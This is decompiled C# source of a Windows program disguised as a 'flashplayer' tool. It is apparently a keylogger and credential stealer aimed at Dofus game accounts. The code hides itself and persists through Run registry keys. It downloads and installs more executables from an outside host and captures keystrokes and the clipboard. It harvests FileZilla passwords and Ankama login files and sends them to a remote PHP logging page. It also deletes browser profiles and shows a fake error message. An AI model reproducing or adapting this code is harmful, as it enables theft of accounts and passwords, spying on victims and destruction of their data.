using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using Microsoft.Win32;
using flashplayer.My;

namespace flashplayer;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer icontainer_0;

	[AccessedThroughProperty("Timer1")]
	private Timer timer_0;

	[AccessedThroughProperty("Timer2")]
	private Timer timer_1;

	[AccessedThroughProperty("Timer3")]
	private Timer timer_2;

	[AccessedThroughProperty("Timer4")]
	private Timer timer_3;

	[AccessedThroughProperty("Timer5")]
	private Timer timer_4;

	private RichTextBox richTextBox_0;

	private string string_0;

	private string string_1;

	private string string_2;

	private string string_3;

	private string string_4;

	private string string_5;

	private string string_6;

	private string string_7;

	private string string_8;

	private string string_9;

	private string string_10;

	private string string_11;

	private string string_12;

	private string string_13;

	private string string_14;

	private string string_15;

	private string string_16;

	private string string_17;

	private string string_18;

	private string string_19;

	private string string_20;

	private string string_21;

	private string string_22;

	private bool bool_0;

	private string string_23;

	private fonc fonc_0;

	internal virtual Timer Timer_0
	{
		[DebuggerNonUserCode]
		get
		{
			return timer_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer_0_Tick;
			if (timer_0 != null)
			{
				timer_0.remove_Tick(eventHandler);
			}
			timer_0 = value;
			if (timer_0 != null)
			{
				timer_0.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer_1
	{
		[DebuggerNonUserCode]
		get
		{
			return timer_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer_1_Tick;
			if (timer_1 != null)
			{
				timer_1.remove_Tick(eventHandler);
			}
			timer_1 = value;
			if (timer_1 != null)
			{
				timer_1.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer_2
	{
		[DebuggerNonUserCode]
		get
		{
			return timer_2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer_2_Tick;
			if (timer_2 != null)
			{
				timer_2.remove_Tick(eventHandler);
			}
			timer_2 = value;
			if (timer_2 != null)
			{
				timer_2.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer_3
	{
		[DebuggerNonUserCode]
		get
		{
			return timer_3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer_3_Tick;
			if (timer_3 != null)
			{
				timer_3.remove_Tick(eventHandler);
			}
			timer_3 = value;
			if (timer_3 != null)
			{
				timer_3.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer_4
	{
		[DebuggerNonUserCode]
		get
		{
			return timer_4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer_4_Tick;
			if (timer_4 != null)
			{
				timer_4.remove_Tick(eventHandler);
			}
			timer_4 = value;
			if (timer_4 != null)
			{
				timer_4.add_Tick(eventHandler);
			}
		}
	}

	public Form1()
	{
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).add_Leave((EventHandler)Form1_Leave);
		richTextBox_0 = new RichTextBox();
		string_20 = Conversions.ToString(2);
		string_22 = "Stalkerz";
		string_23 = Conversions.ToString(0);
		fonc_0 = new fonc();
		InitializeComponent();
	}

	[STAThread]
	public static void Main()
	{
		Application.Run((Form)(object)MyProject.MyForms_0.Form1);
	}

	[DebuggerNonUserCode]
	protected override void vmethod_0(bool bool_1)
	{
		try
		{
			if (bool_1 && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(bool_1);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Expected O, but got Unknown
		//IL_0055: Unknown result type (might be due to invalid IL or missing references)
		//IL_005f: Expected O, but got Unknown
		//IL_0066: Unknown result type (might be due to invalid IL or missing references)
		//IL_0070: Expected O, but got Unknown
		//IL_00c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ce: Expected O, but got Unknown
		icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		Timer_0 = new Timer(icontainer_0);
		Timer_1 = new Timer(icontainer_0);
		Timer_2 = new Timer(icontainer_0);
		Timer_3 = new Timer(icontainer_0);
		Timer_4 = new Timer(icontainer_0);
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.Black);
		Size clientSize = new Size(0, 0);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Null");
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		Mutex mutex = new Mutex(initiallyOwned: true, "JeSuisUneDanseuseEtoile");
		try
		{
			mutex.ReleaseMutex();
			mutex.WaitOne();
			method_7();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			((Form)this).Close();
			ProjectData.ClearProjectError();
		}
	}

	private void Form1_Leave(object sender, EventArgs e)
	{
		fonc_0.method_4();
		Timer_0.Stop();
	}

	private void Timer_0_Tick(object sender, EventArgs e)
	{
		RichTextBox val = richTextBox_0;
		val.set_Text(val.get_Text() + fonc_0.string_1);
		fonc_0.string_1 = "";
	}

	private void Timer_1_Tick(object sender, EventArgs e)
	{
		//IL_0040: Unknown result type (might be due to invalid IL or missing references)
		//IL_0046: Expected O, but got Unknown
		//IL_00b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Invalid comparison between Unknown and I4
		if ((Operators.CompareString(richTextBox_0.get_Text(), "", false) == 0) | (Operators.CompareString(richTextBox_0.get_Text(), (string)null, false) == 0))
		{
			return;
		}
		try
		{
			string text = richTextBox_0.get_Text();
			WebBrowser val = new WebBrowser();
			string uriString = "http://heavencorp.free.fr/mylogs.php?to=" + string_22 + "&name=" + ((ServerComputer)MyProject.MyComputer_0).get_Name() + "&os=" + ((ServerComputer)MyProject.MyComputer_0).get_Info().get_OSFullName();
			val.Navigate(new Uri(uriString));
			while ((int)val.get_ReadyState() != 4)
			{
				Application.DoEvents();
			}
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\sitemanager.xml"))
			{
				text = Conversions.ToString(Operators.AddObject((object)text, method_10()));
			}
			if (Operators.ConditionalCompareObjectNotEqual(method_4(), (object)string_15, false))
			{
				text = Conversions.ToString(Operators.AddObject((object)text, Operators.ConcatenateObject((object)"\r\n\r\nPresse Papier : ", method_4())));
				string_15 = Conversions.ToString(method_4());
			}
			if (File.Exists(Application.get_StartupPath() + "\\config12.ini"))
			{
				File.AppendAllText(Application.get_StartupPath() + "\\config12.ini", Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(text + "\r\n", "\r\n"), method_5())));
			}
			else
			{
				File.AppendAllText(Application.get_StartupPath() + "\\config12.ini", Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(text + "\r\n", "\r\n"), method_5())));
			}
			val.get_Document().GetElementById("logs").SetAttribute("Value", Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(text + "\r\n", "\r\n"), method_5())));
			val.get_Document().GetElementById("submit").InvokeMember("Click");
			richTextBox_0.set_Text((string)null);
			string_23 = Conversions.ToString(0);
			string_18 = Conversions.ToString(Conversions.ToDouble(string_18) + 1.0);
			if (Conversions.ToDouble(string_18) == 5.0)
			{
				Application.Restart();
				((Form)this).Close();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Application.Restart();
			((Form)this).Close();
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public bool method_0(string string_24)
	{
		bool result = false;
		if (Strings.StrComp(string_24, (string)null, (CompareMethod)1) == 1 && Strings.StrComp(FileSystem.Dir(string_24, (FileAttribute)0), (string)null, (CompareMethod)1) == 1)
		{
			result = true;
		}
		return result;
	}

	private bool method_1(string string_24)
	{
		HttpWebRequest httpWebRequest = null;
		HttpWebResponse httpWebResponse = null;
		try
		{
			httpWebRequest = (HttpWebRequest)WebRequest.Create(string_24);
			httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			httpWebRequest.Abort();
			if (httpWebResponse.StatusCode == HttpStatusCode.OK)
			{
				return true;
			}
			return false;
		}
		catch (WebException projectError)
		{
			ProjectData.SetProjectError((Exception)projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private void method_2()
	{
		try
		{
			if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Internet Explorer\\UserData"))
			{
				((ServerComputer)MyProject.MyComputer_0).get_FileSystem().DeleteDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Internet Explorer\\UserData", (DeleteDirectoryOption)5);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox"))
			{
				((ServerComputer)MyProject.MyComputer_0).get_FileSystem().DeleteDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox", (DeleteDirectoryOption)5);
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera\\Opera"))
			{
				((ServerComputer)MyProject.MyComputer_0).get_FileSystem().DeleteDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera\\Opera", (DeleteDirectoryOption)5);
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default"))
			{
				((ServerComputer)MyProject.MyComputer_0).get_FileSystem().DeleteDirectory(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default", (DeleteDirectoryOption)5);
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\AnkamaCertificates\\v2-RELEASE"))
			{
				((ServerComputer)MyProject.MyComputer_0).get_FileSystem().DeleteDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\AnkamaCertificates\\v2-RELEASE", (DeleteDirectoryOption)5);
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
	}

	private void method_3()
	{
		string path = Application.get_StartupPath() + "\\date.ini";
		Timer_2.Start();
		try
		{
			DateTime dateTime = DateAndTime.DateValue(Conversions.ToString(DateAndTime.get_Now()));
			if (File.Exists(path))
			{
				string text = File.ReadAllText(path);
				if (text.Contains(Conversions.ToString(dateTime)))
				{
					return;
				}
				File.AppendAllText(path, Conversions.ToString(dateTime));
			}
			else
			{
				File.AppendAllText(path, Conversions.ToString(dateTime));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		Process[] processesByName = Process.GetProcessesByName("firefox");
		foreach (Process process in processesByName)
		{
			process.Kill();
		}
		Process[] processesByName2 = Process.GetProcessesByName("iexplorer");
		foreach (Process process2 in processesByName2)
		{
			process2.Kill();
		}
		Process[] processesByName3 = Process.GetProcessesByName("chrome");
		foreach (Process process3 in processesByName3)
		{
			process3.Kill();
		}
		Process[] processesByName4 = Process.GetProcessesByName("opera");
		foreach (Process process4 in processesByName4)
		{
			process4.Kill();
		}
		Process[] processesByName5 = Process.GetProcessesByName("DofusMod");
		foreach (Process process5 in processesByName5)
		{
			process5.Kill();
		}
		Process[] processesByName6 = Process.GetProcessesByName("Dofus");
		foreach (Process process6 in processesByName6)
		{
			process6.Kill();
		}
		Timer_4.Start();
	}

	private void Timer_3_Tick(object sender, EventArgs e)
	{
		method_3();
		Timer_3.Stop();
	}

	private void Timer_4_Tick(object sender, EventArgs e)
	{
		method_2();
		Timer_4.Stop();
	}

	private object method_4()
	{
		return ((Computer)MyProject.MyComputer_0).get_Clipboard().GetText();
	}

	public object method_5()
	{
		string text = null;
		try
		{
			int num = default(int);
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Dofus2\\Module_Ankama_Connection.dat"))
			{
				string[] array = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Dofus2\\Module_Ankama_Connection.dat").Split(new char[1] { 'n' });
				text += "NDC :";
				string[] array2 = array;
				for (int i = 0; i < array2.Length; i++)
				{
					if (num > 0)
					{
						if (num > 1)
						{
							text += "n";
						}
						text += array[num];
					}
					num++;
				}
				text += "\r\n";
			}
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Dofus 2\\Module_Ankama_Connection.dat"))
			{
				string[] array = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Dofus 2\\Module_Ankama_Connection.dat").Split(new char[1] { 'n' });
				text += "NDC :";
				string[] array3 = array;
				for (int j = 0; j < array3.Length; j++)
				{
					if (num > 0)
					{
						if (num > 1)
						{
							text += "n";
						}
						text += array[num];
					}
					num++;
				}
				return text + "\r\n";
			}
			return text;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private void method_6()
	{
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\launcher.exe"))
			{
				((ServerComputer)MyProject.MyComputer_0).get_Network().DownloadFile("http://heavencorp.free.fr/dwn/launcher.txt", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\launcher.exe");
				method_8();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\launcher.exe"))
			{
				((ServerComputer)MyProject.MyComputer_0).get_Network().DownloadFile("http://heavencorp.free.fr/dwn/launcher.txt", Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\launcher.exe");
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Dofus2\\app"))
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Dofus2\\app\\DofusMod.exe"))
				{
					File.Move(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Dofus2\\app\\DofusMod.exe", Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Dofus2\\app\\save.ini");
				}
				((ServerComputer)MyProject.MyComputer_0).get_Network().DownloadFile("http://heavencorp.free.fr/dwn/DofusMod.txt", Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Dofus2\\app\\DofusMod.exe");
			}
			else if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + " (x86)\\Dofus2\\app"))
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + " (x86)\\Dofus2\\app\\DofusMod.exe"))
				{
					File.Move(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + " (x86)\\Dofus2\\app\\DofusMod.exe", Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + " (x86)\\Dofus2\\app\\save.ini");
				}
				((ServerComputer)MyProject.MyComputer_0).get_Network().DownloadFile("http://heavencorp.free.fr/dwn/DofusMod.txt", Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + " (x86)\\Dofus2\\app\\DofusMod.exe");
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			method_9(string_12, "updater");
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").SetValue("updater", string_12);
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").SetValue("updater", string_12);
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
	}

	private void method_7()
	{
		try
		{
			string_12 = Path.GetTempPath() + "updater.exe";
			if (((ServerComputer)MyProject.MyComputer_0).get_FileSystem().FileExists(string_12))
			{
				if (!File.Exists(Application.get_StartupPath() + "\\date.ini"))
				{
					method_6();
				}
				bool_0 = method_1("http://heavencorp.free.fr/");
				fonc_0.method_5();
				Timer_0.set_Interval(50);
				Timer_0.Start();
				Timer_1.set_Interval(300000);
				Timer_1.Start();
				Timer_4.set_Interval(5000);
				Timer_2.set_Interval(60000);
				Timer_3.set_Interval(10000);
				Timer_3.Start();
			}
			else
			{
				File.Move(Application.get_ExecutablePath(), string_12);
				Process.Start(string_12);
				((Form)this).Close();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_8()
	{
		try
		{
			method_9(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\launcher.exe", "launcher");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").SetValue("launcher", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\launcher.exe");
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").SetValue("launcher", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\launcher.exe");
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	private void method_9(string string_24, string string_25)
	{
		try
		{
			Process process = new Process();
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = "cmd";
			processStartInfo.RedirectStandardInput = true;
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			process.StartInfo = processStartInfo;
			process.Start();
			StreamReader standardOutput = process.StandardOutput;
			StreamWriter standardInput = process.StandardInput;
			standardInput.WriteLine("cd " + string_24);
			standardInput.WriteLine("FOR /R %I IN (*" + string_25 + "*) DO > %I:Zone.Identifier ECHO.");
			standardInput.WriteLine("exit");
			Console.WriteLine(standardOutput.ReadToEnd());
			standardInput.Close();
			standardOutput.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private object method_10()
	{
		StreamReader streamReader = new StreamReader(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\sitemanager.xml");
		string text = null;
		string text2 = streamReader.ReadLine();
		text = "\r\n\r\n//// FilleZila \\\\\\\\";
		while (text2 != null)
		{
			if (text2.Contains("Host"))
			{
				text = text + "\r\n\r\n" + text2 + "\r\n";
			}
			if (text2.Contains("Port"))
			{
				text = text + text2 + "\r\n";
			}
			if (text2.Contains("User"))
			{
				text = text + text2 + "\r\n";
			}
			if (text2.Contains("Pass"))
			{
				text = text + text2 + "\r\n";
			}
			text2 = streamReader.ReadLine();
		}
		return text;
	}

	private object method_11(string string_24)
	{
		bool flag = false;
		DirectoryInfo directoryInfo = new DirectoryInfo(string_24);
		FileInfo[] files = directoryInfo.GetFiles("*.*");
		for (int i = 0; i < files.Length; i++)
		{
			flag = true;
		}
		return flag;
	}

	private void Timer_2_Tick(object sender, EventArgs e)
	{
		Timer_2.set_Interval(100);
		try
		{
			if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\AnkamaCertificates\\v2-RELEASE") || !Conversions.ToBoolean(method_11(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\AnkamaCertificates\\v2-RELEASE")))
			{
				return;
			}
			Process[] processes = Process.GetProcesses();
			Process[] array = processes;
			foreach (Process process in array)
			{
				if (process.ProcessName.Contains("Dofus"))
				{
					process.Kill();
				}
			}
			((ServerComputer)MyProject.MyComputer_0).get_FileSystem().DeleteDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\AnkamaCertificates\\v2-RELEASE", (DeleteDirectoryOption)5);
			MyProject.MyForms_0.Dofus.Label1.set_Text("ERROR : \r\nUnable to get value get_hash_code() in get_certificat()\r\n\r\nPlease, contact support for more information");
			((Control)MyProject.MyForms_0.Dofus).Show();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
